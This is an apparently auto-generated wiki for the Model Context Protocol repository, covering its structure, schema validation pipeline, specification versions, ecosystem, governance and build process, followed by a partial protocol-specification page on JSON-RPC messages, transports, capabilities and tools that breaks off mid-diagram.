# Page: Overview

# Overview

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [MAINTAINERS.md](MAINTAINERS.md)
- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

This document provides an overview of the `modelcontextprotocol/modelcontextprotocol` repository, which serves as the **authoritative source** for the Model Context Protocol specification, schema definitions, protocol documentation, and community governance structures. The repository functions as a multi-purpose system that:

- Defines the MCP specification through versioned releases
- Maintains the TypeScript schema as the single source of truth for JSON-RPC message types
- Publishes comprehensive documentation to modelcontextprotocol.io
- Coordinates the MCP ecosystem including **96+ clients** and **~2,000 servers**
- Establishes governance processes for protocol evolution

The protocol has achieved significant adoption since its launch, with a 407% growth in servers since September 2024 and an active contributor community of 2,900+ Discord members with 100+ new contributors joining weekly.

For details on specific aspects of MCP:
- **Protocol architecture and message types**: See page 2.1
- **Building MCP servers**: See page 5
- **Working with MCP clients**: See page 4
- **Contributing to the specification**: See page 6

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:1-240](), [docs/docs.json](), Diagram 1 and Diagram 3 from high-level architecture

## Repository Architecture

The repository is organized into distinct functional areas, each serving a specific role in the MCP ecosystem.

### Repository Structure

```mermaid
graph TB
    subgraph "Specification Sources"
        SCHEMA["schema/draft/schema.ts<br/>TypeScript definitions"]
        SCHEMA_JSON["schema/draft/schema.json<br/>Generated JSON Schema"]
    end
    
    subgraph "Versioned Specifications"
        DRAFT["specification/draft/<br/>Current development"]
        V2025_06["specification/2025-06-18/<br/>Latest stable"]
        V2025_03["specification/2025-03-26/"]
        V2024_11["specification/2024-11-05/"]
    end
    
    subgraph "Documentation"
        DOCS["docs/**/*.mdx<br/>Tutorials and guides"]
        BLOG["blog/<br/>Hugo posts"]
        DOCS_JSON["docs.json<br/>Mintlify config"]
    end
    
    subgraph "Community"
        MAINTAINERS["MAINTAINERS.md"]
        GOVERNANCE["docs/community/governance.mdx"]
        COC["CODE_OF_CONDUCT.md"]
        SECURITY["SECURITY.md"]
        ANTITRUST["ANTITRUST.md"]
    end
    
    subgraph "Build System"
        PACKAGE["package.json<br/>npm scripts"]
        TSCONFIG["tsconfig.json"]
        GH_WORKFLOWS[".github/workflows/"]
    end
    
    SCHEMA -->|generates| SCHEMA_JSON
    SCHEMA -->|generates| DRAFT
    PACKAGE -->|executes| GH_WORKFLOWS
    DOCS_JSON -->|configures| DOCS
```

Sources: [docs/docs.json:1-407](), [package.json](), [schema/draft/schema.ts](), Diagram 1 from high-level architecture

### Key Directory Functions

| Directory | Purpose | Key Files |
|-----------|---------|-----------|
| `schema/draft/` | Single source of truth for protocol types | `schema.ts`, `schema.json` |
| `specification/{version}/` | Versioned protocol specifications | `index.mdx`, `architecture/`, `basic/`, `server/`, `client/` |
| `docs/` | User-facing documentation | `docs/**/*.mdx`, `docs.json` |
| `blog/` | Blog posts and announcements | Hugo-formatted markdown |
| `.github/workflows/` | CI/CD automation | `main.yml`, `markdown-format.yml` |
| `docs/community/` | Governance documentation | `governance.mdx`, `sep-guidelines.mdx` |

Sources: [docs/docs.json:1-407](), File listing from context

## Schema System

The TypeScript schema at [schema/draft/schema.ts]() is the **single source of truth** for all MCP protocol definitions. All other artifacts derive from this canonical source.

### Schema Generation Pipeline

```mermaid
graph LR
    SCHEMA_TS["schema/draft/schema.ts<br/>TypeScript source"]
    
    SCHEMA_JSON["schema/draft/schema.json<br/>JSON Schema output"]
    
    SPEC_MDX["docs/specification/draft/schema.mdx<br/>Documentation output"]
    
    NPM_CHECK_TS["npm run check:schema:ts<br/>TypeScript validation"]
    NPM_CHECK_JSON["npm run check:schema:json<br/>JSON Schema sync check"]
    NPM_CHECK_MD["npm run check:schema:md<br/>Documentation sync check"]
    
    SCHEMA_TS -->|"typescript-json-schema"| SCHEMA_JSON
    SCHEMA_TS -->|"typedoc"| SPEC_MDX
    
    SCHEMA_TS --> NPM_CHECK_TS
    SCHEMA_JSON --> NPM_CHECK_JSON
    SPEC_MDX --> NPM_CHECK_MD
```

Sources: [package.json](), [schema/draft/schema.ts](), Diagram 4 from high-level architecture

### Schema Validation Commands

The build system enforces schema consistency through automated validation:

| Command | Purpose | Implementation |
|---------|---------|----------------|
| `npm run check:schema:ts` | Validates TypeScript compilation | Runs `tsc` on schema source |
| `npm run check:schema:json` | Verifies JSON Schema is synchronized | Compares generated vs committed JSON |
| `npm run check:schema:md` | Verifies documentation is synchronized | Compares generated vs committed MDX |

Sources: [package.json](), [CONTRIBUTING.md]()

## Specification Versioning

The repository maintains **four active specification versions**, balancing stability with rapid iteration.

### Version Lifecycle

```mermaid
graph LR
    DRAFT["Draft<br/>specification/draft/<br/>Active development"]
    V2025_11["2025-11-25<br/>Latest stable<br/>Current production"]
    V2025_06["2025-06-18<br/>Previous stable"]
    V2025_03["2025-03-26<br/>Historical stable"]
    V2024_11["2024-11-05<br/>Legacy stable"]
    
    DRAFT -->|"Matures into"| V2025_11
    V2025_11 -->|"Supersedes"| V2025_06
    V2025_06 -->|"Supersedes"| V2025_03
    V2025_03 -->|"Supersedes"| V2024_11
```

The `2025-11-25` release introduced major features including task-based workflows ([SEP-1686]()), simplified authorization via Client ID Metadata Documents ([SEP-991]()), URL mode elicitation ([SEP-1036]()), and sampling with tools for agentic servers ([SEP-1577]()).

Sources: [docs/docs.json:65-117](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-240](), [docs/specification/draft/basic/utilities/tasks.mdx:1-15](), Diagram 2 from high-level architecture

### Specification Enhancement Process (SEP)

Protocol changes follow a formal SEP workflow defined in [SEP-1850]() that uses a pull request-based process:

1. **Draft proposal** in `seps/0000-{slug}.md` 
2. **Open pull request** to the `seps/` directory
3. **Find sponsor** from [MAINTAINERS.md]() list
4. **Formal review** by Core Maintainers
5. **Reference implementation** before finalization

The SEP workflow transitioned from GitHub Issues to pull requests in November 2025 to provide better version control, collaborative editing, and centralized discussion.

Sources: [seps/1850-pr-based-sep-workflow.md:1-158](), [blog/content/posts/2025-11-28-sep-process-update.md:1-85](), [docs/community/sep-guidelines.mdx]()

## Documentation Infrastructure

Documentation is built using two separate systems that publish to a unified website.

### Documentation Build Flow

```mermaid
graph TB
    subgraph "Source Content"
        MDX_DOCS["docs/**/*.mdx<br/>Tutorials, guides, concepts"]
        SPEC_DOCS["specification/**/*.mdx<br/>Protocol specifications"]
        BLOG_MD["blog/**/*.md<br/>Hugo-formatted posts"]
    end
    
    subgraph "Build Configuration"
        DOCS_JSON["docs.json<br/>Mintlify navigation config"]
        HUGO_CONFIG["Hugo configuration"]
    end
    
    subgraph "Build Systems"
        MINTLIFY["Mintlify Builder<br/>Specifications + Tutorials"]
        HUGO["Hugo Static Generator<br/>Blog posts"]
    end
    
    subgraph "Published Site"
        WEBSITE["modelcontextprotocol.io<br/>Unified documentation site"]
    end
    
    MDX_DOCS --> MINTLIFY
    SPEC_DOCS --> MINTLIFY
    DOCS_JSON --> MINTLIFY
    
    BLOG_MD --> HUGO
    HUGO_CONFIG --> HUGO
    
    MINTLIFY --> WEBSITE
    HUGO --> WEBSITE
```

Sources: [docs/docs.json:1-407](), [docs.json theme and navigation structure](), Diagram 1 and 4 from high-level architecture

### Documentation Configuration

The [docs.json]() file configures Mintlify with:

- **Navigation structure**: Tab-based organization with nested groups
- **Theming**: Colors, logos, favicon
- **Redirects**: URL compatibility mappings
- **External links**: GitHub repository, blog

Key navigation tabs defined in [docs.json:24-301]():

| Tab | Key Sections | Page Count |
|-----|--------------|------------|
| Documentation | Getting started, About MCP, Develop with MCP, Developer tools | ~20 pages |
| Specification | Architecture, Base Protocol, Client Features, Server Features | ~15 pages per version × 4 versions |
| Community | Communication, Governance, Roadmap, Examples | ~10 pages |
| About MCP | Project overview | 1 page |

Sources: [docs/docs.json:1-407]()

## Client and Server Ecosystem

The MCP ecosystem encompasses diverse implementations across clients, servers, and SDKs.

### Ecosystem Statistics

```mermaid
graph TB
    subgraph "MCP Clients: 96+ Total"
        IDE["IDE/Editors<br/>~20 clients<br/>VS Code, Cursor, Zed, JetBrains"]
        DESKTOP["Desktop Apps<br/>~15 clients<br/>Claude Desktop, BoltAI, Chatbox"]
        WEB["Web Apps<br/>~10 clients<br/>Claude.ai, ChatGPT, Glama"]
        CLI["CLI Tools<br/>~8 clients<br/>Amazon Q CLI, Goose, gptme"]
        FRAMEWORK["Frameworks/SDKs<br/>~12 clients<br/>fast-agent, Langflow, Genkit"]
        COMMS["Communication<br/>~5 clients<br/>Slack MCP Client, Klavis AI"]
    end
    
    subgraph "Feature Adoption"
        TOOLS["Tools: ~95%<br/>Near-universal adoption"]
        RESOURCES["Resources: ~40%<br/>Secondary priority"]
        PROMPTS["Prompts: ~40%<br/>Secondary priority"]
        SAMPLING["Sampling: ~15%<br/>Specialized use cases"]
    end
    
    subgraph "MCP Servers: ~2,000 Total"
        REF_SERVERS["Reference Servers<br/>Everything, Fetch, Filesystem, Git, Memory"]
        OFFICIAL["Official Integrations<br/>Notion, Stripe, GitHub, Hugging Face"]
        COMMUNITY["Community Servers<br/>~2,000 in Registry<br/>407% growth since Sept 2024"]
    end
    
    subgraph "MCP SDKs: 10 Languages"
        SDK_TS["TypeScript"]
        SDK_PY["Python"]
        SDK_JAVA["Java"]
        SDK_KOTLIN["Kotlin"]
        SDK_GO["Go"]
        SDK_CSHARP["C#"]
        SDK_SWIFT["Swift"]
        SDK_RUBY["Ruby"]
        SDK_RUST["Rust"]
        SDK_PHP["PHP"]
    end
    
    IDE --> TOOLS
    DESKTOP --> TOOLS
    WEB --> TOOLS
    CLI --> RESOURCES
    FRAMEWORK --> RESOURCES
    
    REF_SERVERS --> SDK_TS
    REF_SERVERS --> SDK_PY
    OFFICIAL --> SDK_JAVA
    COMMUNITY --> SDK_TS
    COMMUNITY --> SDK_PY
```

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:18-28](), [docs/clients.mdx](), [docs/sdk.mdx:10-61](), Diagram 3 and Diagram 5 from high-level architecture

### Reference Server Implementations

The repository references official server implementations at `github.com/modelcontextprotocol/servers`:

| Server | Purpose | Execution |
|--------|---------|-----------|
| Everything | Test bed for all MCP features | `npx @modelcontextprotocol/server-everything` |
| Fetch | Web content retrieval | `npx @modelcontextprotocol/server-fetch` |
| Filesystem | File operations | `npx @modelcontextprotocol/server-filesystem` |
| Git | Repository management | `uvx mcp-server-git` |
| Memory | Knowledge graph persistence | `npx @modelcontextprotocol/server-memory` |
| Sequential Thinking | Chain-of-thought reasoning | `uvx mcp-server-sequential-thinking` |
| Time | Timezone and time operations | `uvx mcp-server-time` |

### Official Integrations

Major companies have built MCP server integrations:

- **Notion**: Note and workspace management via `@modelcontextprotocol/server-notion`
- **Stripe**: Payment workflows and API management via Stripe's MCP server
- **GitHub**: Repository and code management via `github/github-mcp-server`
- **Hugging Face**: Model and dataset management via `huggingface/hf-mcp-server`
- **Postman**: API testing automation via `postmanlabs/postman-mcp-server`

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:18-28](), [docs/examples.mdx](), [docs/tools/inspector.mdx:24-46]()

## Governance Structure

MCP follows a three-tier maintainer hierarchy with clear decision-making authority.

### Maintainer Hierarchy

```mermaid
graph TB
    subgraph "Steering Group"
        LEAD["Lead Maintainers: 2<br/>David Soria Parra<br/>Justin Spahr-Summers (inactive)<br/>Ultimate veto power"]
        
        CORE["Core Maintainers: 9<br/>Inna Harper, Basil Hosmer<br/>Paul Carleton, Nick Cooper<br/>Nick Aldridge, Che Liu<br/>Den Delimarsky<br/>Specification oversight"]
        
        MAINTAINERS["Maintainers: 58 Total<br/>SDK: ~30 across 10 languages<br/>Projects: Inspector, Registry, MCPB<br/>WG/IG: 7 groups"]
    end
    
    subgraph "Community: 2,900+ Discord Members"
        CONTRIBUTORS["Contributors<br/>~100 new weekly<br/>File issues, PRs<br/>Participate in WG/IG"]
        
        MODERATORS["Community Moderators: 5<br/>Ola Hungerford, Cliff Hall<br/>Shaun Smith, Jonathan Hefner<br/>Tadas Antanavicius"]
    end
    
    LEAD -->|"Appoints/removes"| CORE
    LEAD -->|"Veto power"| CORE
    CORE -->|"Appoints/removes"| MAINTAINERS
    CORE -->|"Veto power"| MAINTAINERS
    MAINTAINERS -->|"Sponsors"| SEP["SEP Proposals<br/>seps/*.md"]
    CONTRIBUTORS -->|"Submits"| SEP
    MODERATORS -->|"Manages"| CONTRIBUTORS
```

Sources: [MAINTAINERS.md:1-180](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:102-127](), [docs/community/governance.mdx](), Diagram 5 from high-level architecture

### Communication Channels

Decision-making and discussion occur across structured channels:

| Channel | Purpose | Audience |
|---------|---------|----------|
| Discord | Real-time discussion, public + limited private | All participants |
| GitHub Discussions | Long-form planning, feature requests | All participants |
| GitHub Issues | Bug reports, SEP tracking | All participants |
| Bi-weekly Core Meetings | SEP review and approval | Core Maintainers |
| Community Calendar | WG/IG meeting schedules | All participants at `meet.modelcontextprotocol.io` |

Sources: [docs/community/communication.mdx](), [docs/community/governance.mdx](), Diagram 6 from high-level architecture

## Build and CI/CD Pipeline

Continuous integration enforces quality standards through automated checks.

### GitHub Actions Workflows

```mermaid
graph TB
    subgraph "Developer Actions"
        EDIT_TS["Edit schema/draft/schema.ts"]
        EDIT_DOCS["Edit docs/**/*.mdx"]
        EDIT_SPEC["Edit specification/**/*.mdx"]
    end
    
    subgraph "Local Validation"
        CHECK_TS["npm run check:schema:ts"]
        CHECK_JSON["npm run check:schema:json"]
        CHECK_MD["npm run check:schema:md"]
    end
    
    subgraph "GitHub Actions"
        MAIN_YML[".github/workflows/main.yml<br/>Schema validation"]
        MARKDOWN_YML[".github/workflows/markdown-format.yml<br/>Markdown formatting"]
    end
    
    subgraph "Publishing"
        MINTLIFY_DEPLOY["Mintlify Deploy<br/>Documentation site"]
        HUGO_DEPLOY["Hugo Deploy<br/>Blog site"]
        WEBSITE["modelcontextprotocol.io"]
    end
    
    EDIT_TS --> CHECK_TS
    EDIT_TS --> CHECK_JSON
    EDIT_TS --> CHECK_MD
    
    EDIT_DOCS --> MARKDOWN_YML
    EDIT_SPEC --> MARKDOWN_YML
    
    CHECK_TS --> MAIN_YML
    CHECK_JSON --> MAIN_YML
    CHECK_MD --> MAIN_YML
    
    MAIN_YML --> MINTLIFY_DEPLOY
    MARKDOWN_YML --> MINTLIFY_DEPLOY
    
    EDIT_DOCS --> HUGO_DEPLOY
    
    MINTLIFY_DEPLOY --> WEBSITE
    HUGO_DEPLOY --> WEBSITE
```

Sources: [package.json](), [.github/workflows/main.yml](), [.github/workflows/markdown-format.yml](), Diagram 4 from high-level architecture

### Validation Pipeline

The CI/CD system enforces:

1. **TypeScript compilation**: Schema must compile without errors
2. **JSON Schema synchronization**: Generated JSON must match committed version
3. **Documentation synchronization**: Generated MDX must match committed version
4. **Markdown formatting**: Prettier formatting must be consistent
5. **Link validation**: Internal and external links must resolve

Sources: [package.json](), [CONTRIBUTING.md](), Workflow files referenced in diagrams

## Security and Compliance

The repository maintains strict security and legal compliance policies.

### Security Reporting

Vulnerability disclosure follows the process defined in [SECURITY.md]():

- **Reporting channel**: HackerOne vulnerability disclosure program
- **Scope**: Validated security issues in MCP specification and reference implementations
- **Process**: Follows Anthropic's security response procedures

Sources: [SECURITY.md](), [docs/community/security-policy.mdx]()

### Legal Framework

| Policy | File | Purpose |
|--------|------|---------|
| Code of Conduct | [CODE_OF_CONDUCT.md]() | Contributor Covenant behavioral standards |
| Antitrust Policy | [ANTITRUST.md]() | Competition law compliance for participants |
| Governance Model | [docs/community/governance.mdx]() | Decision-making authority and processes |

Sources: [CODE_OF_CONDUCT.md](), [ANTITRUST.md](), [docs/community/governance.mdx](), [docs/community/antitrust.mdx]()

## Development Workflow

Contributors interact with the repository through standardized processes.

### Contribution Flow

```mermaid
graph TB
    PROBLEM["Identify Problem<br/>Community discussion"]
    
    PROTOTYPE["Build Prototype<br/>Concrete + Minimal"]
    
    SEP_ISSUE["Create SEP Issue<br/>specification repo"]
    
    SPONSOR["Find Sponsor<br/>Steering Group member"]
    
    REVIEW["Core Maintainer Review<br/>Bi-weekly meetings"]
    
    IMPLEMENT["Reference Implementation<br/>Validated in practice"]
    
    MERGE["Merge to Draft<br/>specification/draft/"]
    
    SCHEMA_UPDATE["Update schema/draft/schema.ts<br/>If protocol changes"]
    
    VALIDATION["Run validation checks<br/>npm run check:schema:*"]
    
    PROBLEM --> PROTOTYPE
    PROTOTYPE --> SEP_ISSUE
    SEP_ISSUE --> SPONSOR
    SPONSOR --> REVIEW
    REVIEW -->|"Approved"| IMPLEMENT
    IMPLEMENT --> MERGE
    MERGE --> SCHEMA_UPDATE
    SCHEMA_UPDATE --> VALIDATION
```

Sources: [CONTRIBUTING.md](), [docs/community/sep-guidelines.mdx](), [docs/community/governance.mdx](), Diagram 4 from high-level architecture

### Local Development Setup

For schema development:

```bash
# Clone repository
git clone https://github.com/modelcontextprotocol/modelcontextprotocol
cd modelcontextprotocol

# Install dependencies
npm install

# Validate schema after changes
npm run check:schema:ts
npm run check:schema:json
npm run check:schema:md
```

For documentation development:

```bash
# Edit files in docs/**/*.mdx or specification/**/*.mdx
# Changes are automatically deployed via Mintlify on commit
```

Sources: [package.json](), [CONTRIBUTING.md](), [README.md]()

## Future Roadmap

The MCP roadmap (documented in [docs/community/roadmap.mdx]()) focuses on:

1. **Agentic workflows**: Enhanced patterns for multi-step agent operations
2. **Enhanced security**: Additional authentication and authorization mechanisms
3. **Validation tools**: Improved testing and compliance verification
4. **Server registry**: Centralized discovery of MCP servers
5. **Multimodality support**: Expanded content type handling

Sources: [docs/community/roadmap.mdx](), [docs/development/roadmap.mdx]()

---

# Page: Protocol Specification

# Protocol Specification

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/basic/index.mdx](docs/specification/2025-06-18/basic/index.mdx)
- [docs/specification/2025-06-18/basic/transports.mdx](docs/specification/2025-06-18/basic/transports.mdx)
- [docs/specification/2025-06-18/basic/utilities/cancellation.mdx](docs/specification/2025-06-18/basic/utilities/cancellation.mdx)
- [docs/specification/2025-06-18/basic/utilities/ping.mdx](docs/specification/2025-06-18/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/transports.mdx](docs/specification/draft/basic/transports.mdx)
- [docs/specification/draft/basic/utilities/cancellation.mdx](docs/specification/draft/basic/utilities/cancellation.mdx)
- [docs/specification/draft/basic/utilities/ping.mdx](docs/specification/draft/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/changelog.mdx](docs/specification/draft/changelog.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

This page documents the Model Context Protocol (MCP) specification—the authoritative definition of how clients and servers communicate. It covers the core messaging system, transport mechanisms, connection lifecycle, and protocol features that enable bidirectional interaction between MCP clients and servers.

This page focuses on the **protocol layer itself**: message types, encoding, transport, and capability negotiation. For information about implementing servers, see [Server Development](#5). For information about client implementations, see [Client Ecosystem](#4). For authorization and security mechanisms, see [Authorization and Security](#3).

## Overview: Protocol Architecture

MCP is built on three foundational layers:

1. **JSON-RPC 2.0 Message System**: All communication uses JSON-RPC 2.0 for encoding requests, responses, and notifications
2. **Transport Layer**: Messages are transmitted via stdio (subprocess) or Streamable HTTP (remote)
3. **Connection Lifecycle**: Clients and servers negotiate capabilities during initialization and maintain sessions

The protocol is **bidirectional**—both clients and servers can initiate requests and send notifications. This enables servers to request LLM sampling from clients, ask for user input via elicitation, and access filesystem roots.

Sources: [schema/draft/schema.ts:1-16](), [docs/specification/draft/basic/transports.mdx:1-20]()

## JSON-RPC Message System

### Message Types

MCP defines three JSON-RPC message types, all encoded as UTF-8 JSON:

| Message Type | Direction | Expects Response | Structure |
|---|---|---|---|
| **Request** | Either direction | Yes | `{jsonrpc: "2.0", id, method, params?}` |
| **Response** | Either direction | No | `{jsonrpc: "2.0", id, result or error}` |
| **Notification** | Either direction | No | `{jsonrpc: "2.0", method, params?}` |

Key constraints:
- Request IDs **MUST** be string or number (never `null`)
- IDs **MUST NOT** be reused within the same session
- Responses **MUST** include either `result` or `error`, never both
- Notifications **MUST NOT** include an ID

Sources: [schema/draft/schema.ts:8-199](), [docs/specification/draft/basic/index.mdx:27-95]()

### Error Handling

MCP defines standard JSON-RPC error codes plus implementation-specific codes:

| Error Code | Name | Usage |
|---|---|---|
| `-32700` | `PARSE_ERROR` | Invalid JSON received |
| `-32600` | `INVALID_REQUEST` | Request structure invalid |
| `-32601` | `METHOD_NOT_FOUND` | Method not supported or capability not declared |
| `-32602` | `INVALID_PARAMS` | Parameters invalid (unknown tool, invalid cursor, etc.) |
| `-32603` | `INTERNAL_ERROR` | Unexpected server error |
| `-32042` | `URL_ELICITATION_REQUIRED` | URL mode elicitation needed (implementation-specific) |

Sources: [schema/draft/schema.ts:201-297]()

### Metadata System (`_meta`)

All requests, responses, and notifications **MAY** include a `_meta` field for attaching metadata. Key names follow a reserved prefix system:

- **Prefix format**: `label.label.label/` (labels separated by dots, followed by slash)
- **Reserved prefixes**: Any prefix containing `modelcontextprotocol` or `mcp` is reserved for MCP use
- **Name format**: Alphanumeric start/end, may contain hyphens, underscores, dots

Example reserved keys:
- `modelcontextprotocol.io/key`
- `mcp.dev/key`
- `io.modelcontextprotocol/related-task`

Request metadata can include `progressToken` to request out-of-band progress notifications.

Sources: [schema/draft/schema.ts:18-51](), [docs/specification/draft/basic/index.mdx:123-150]()

## Transport Layer

### stdio Transport

In stdio transport, the client launches the MCP server as a subprocess:

```
Client Process
    ↓ (launches)
Server Process
    ↑ stdin (client writes JSON-RPC messages)
    ↓ stdout (server writes JSON-RPC messages)
    ↓ stderr (optional logging, ignored by protocol)
```

**Message framing**: Messages are delimited by newlines. Each message is a complete JSON-RPC object on a single line (no embedded newlines).

**Constraints**:
- Server **MUST NOT** write non-MCP data to stdout
- Client **MUST NOT** write non-MCP data to stdin
- Server **MAY** write logging to stderr (client may ignore)

Sources: [docs/specification/draft/basic/transports.mdx:22-52]()

### Streamable HTTP Transport

In Streamable HTTP, the server is an independent process handling multiple client connections via HTTP:

```
Client                          Server
  │                               │
  ├─ POST /mcp (request)         │
  │  Accept: application/json,   │
  │           text/event-stream  │
  │                               │
  ├─────────────────────────────→ │
  │                               │
  │ ← Content-Type: text/event-stream (SSE stream)
  │   or Content-Type: application/json (single response)
  │
  ├─ GET /mcp (listen)           │
  │  Accept: text/event-stream   │
  │                               │
  ├─────────────────────────────→ │
  │                               │
  │ ← Content-Type: text/event-stream (server notifications)
```

**Key features**:

- **POST requests**: Client sends JSON-RPC request, server responds with either:
  - `Content-Type: text/event-stream` (SSE stream with multiple messages)
  - `Content-Type: application/json` (single JSON response)
- **GET requests**: Client opens SSE stream to receive server-initiated notifications
- **Session management**: Server **MAY** assign `MCP-Session-Id` header for stateful sessions
- **Resumability**: SSE events **MAY** include IDs for resuming after disconnection using `Last-Event-ID` header

**Security requirements**:
- Servers **MUST** validate `Origin` header to prevent DNS rebinding attacks
- Servers **SHOULD** bind to localhost (127.0.0.1) when running locally
- Servers **SHOULD** implement proper authentication

Sources: [docs/specification/draft/basic/transports.mdx:54-227]()

## Connection Lifecycle and Capabilities

### Initialization Handshake

The connection lifecycle follows this sequence:

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Initialization Phase
    Client->>Server: initialize request<br/>(protocolVersion, capabilities, clientInfo)
    Server->>Client: initialize response<br/>(protocolVersion, capabilities, serverInfo, instructions?)
    
    Note over Client,Server: Initialized Phase
    Client->>Server: notifications/initialized
    Server->>Client: 202 Accepted
    
    Note over Client,Server: Active Communication
    loop Request/Response/Notification Exchange
        Client->>Server: requests, notifications
        Server->>Client: responses, requests, notifications
    end
```

**Initialize Request** [schema/draft/schema.ts:387-407]():
- `protocolVersion`: Latest protocol version client supports (e.g., `"DRAFT-2026-v1"`)
- `capabilities`: Client capabilities object
- `clientInfo`: Implementation metadata (name, version, description, icons)

**Initialize Response** [schema/draft/schema.ts:417-448]():
- `protocolVersion`: Server's chosen protocol version (client must support or disconnect)
- `capabilities`: Server capabilities object
- `serverInfo`: Implementation metadata
- `instructions?`: Optional workflow instructions for the model

**Initialized Notification** [schema/draft/schema.ts:458-461]():
- Sent by client after receiving initialize response
- Signals that client is ready for normal communication

Sources: [schema/draft/schema.ts:378-461](), [docs/specification/draft/basic/lifecycle.mdx]()

### Capability Negotiation

Capabilities are declared during initialization and determine which protocol features are supported:

**Client Capabilities** [schema/draft/schema.ts:468-567]():

| Capability | Purpose |
|---|---|
| `roots` | Client can list filesystem roots |
| `roots.listChanged` | Client supports root list change notifications |
| `sampling` | Client can invoke LLM sampling |
| `sampling.tools` | Client supports tool use in sampling |
| `sampling.context` | Client supports context inclusion (soft-deprecated) |
| `elicitation` | Client supports user input requests |
| `elicitation.form` | Client supports form mode elicitation |
| `elicitation.url` | Client supports URL mode elicitation |
| `tasks` | Client supports task-augmented requests |
| `tasks.list` | Client supports `tasks/list` operation |
| `tasks.cancel` | Client supports `tasks/cancel` operation |
| `tasks.requests.sampling.createMessage` | Client supports task-augmented sampling |
| `tasks.requests.elicitation.create` | Client supports task-augmented elicitation |
| `extensions` | Client supports optional extensions |

**Server Capabilities** [schema/draft/schema.ts:574-684]():

| Capability | Purpose |
|---|---|
| `logging` | Server can send log messages to client |
| `completions` | Server supports argument autocompletion |
| `prompts` | Server offers prompt templates |
| `prompts.listChanged` | Server supports prompt list change notifications |
| `resources` | Server offers resources to read |
| `resources.subscribe` | Server supports resource subscription |
| `resources.listChanged` | Server supports resource list change notifications |
| `tools` | Server offers tools to call |
| `tools.listChanged` | Server supports tool list change notifications |
| `tasks` | Server supports task-augmented requests |
| `tasks.list` | Server supports `tasks/list` operation |
| `tasks.cancel` | Server supports `tasks/cancel` operation |
| `tasks.requests.tools.call` | Server supports task-augmented tool calls |
| `extensions` | Server supports optional extensions |

**Capability Enforcement**: Requestors **SHOULD** only use features if the receiver declared support. Receivers **MUST** return `-32601 (METHOD_NOT_FOUND)` if a capability-dependent request is received without declaration.

Sources: [schema/draft/schema.ts:468-684]()

## Server Features

### Tools

Tools are functions that servers expose for clients to call. Clients invoke tools via `tools/call` requests.

**Tool Definition** [schema/draft/schema.ts]:
- `name`: Unique identifier
- `description`: Human-readable description
- `inputSchema`: JSON Schema defining tool arguments
- `annotations?`: Optional metadata (audience, priority)
- `execution.taskSupport?`: Whether tool supports task augmentation (`"required"`, `"optional"`, `"forbidden"`)

**Tool Call Flow**:

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: tools/list (get available tools)
    Server->>Client: list of Tool objects
    
    Client->>Server: tools/call<br/>(name, arguments, task?)
    alt Task-augmented
        Server->>Client: CreateTaskResult<br/>(taskId, status: "working")
        Note over Client: Poll for completion
        Client->>Server: tasks/get(taskId)
        Server->>Client: Task status
        Client->>Server: tasks/result(taskId)
        Server->>Client: CallToolResult
    else Normal
        Server->>Client: CallToolResult<br/>(content, isError?)
